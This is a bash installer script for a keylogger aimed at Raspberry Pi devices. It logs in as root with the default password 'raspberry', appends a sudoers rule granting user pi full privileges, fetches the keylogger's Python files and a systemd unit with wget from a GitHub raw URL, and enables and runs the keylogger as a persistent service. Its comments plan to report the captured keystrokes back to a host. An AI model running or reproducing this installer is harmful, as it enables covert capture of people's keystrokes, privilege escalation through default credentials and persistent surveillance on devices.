#!/bin/bash
# application to install, setup, and run the keylogger.

# entry point:
base=https://raw.githubusercontent.com/castle-sam/nice-keylogger/dev/src/

# CHECK THAT USER CAN ISSUE SUDO
# Totally expects the root user to be an unchanged Raspberry Pi
su - root <<!
raspberry
echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers
!

mkdir nicekl && cd nicekl/

# DOWNLOAD FILES if they are not already installed
# nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
CONT=controller.py
KMAP=keymap.py
FKEY=find_keyboard.py
KLSERV=nicekeylogger.service
wget -L "${base}controller.py"
wget -L "${base}keymap.py"
wget -L "${base}find_keyboard.py"
wget -L "${base}nicekeylogger.service"
echo raspberry | sudo -S chmod 744 controller.py

# SET APPLICATION AS A SERVICE WITH SYSTEMD
sudo mv nicekeylogger.service /etc/systemd/system/
sudo systemctl enable nicekeylogger.service
sudo systemctl daemon-reload


# RUN APPLICATION
python3 controller.py &

# REPORT BACK TO HOST
# TODO - decide the period to report back
# TODO - control size of report; only send new content? only send UDP payload? On size == x?

exit
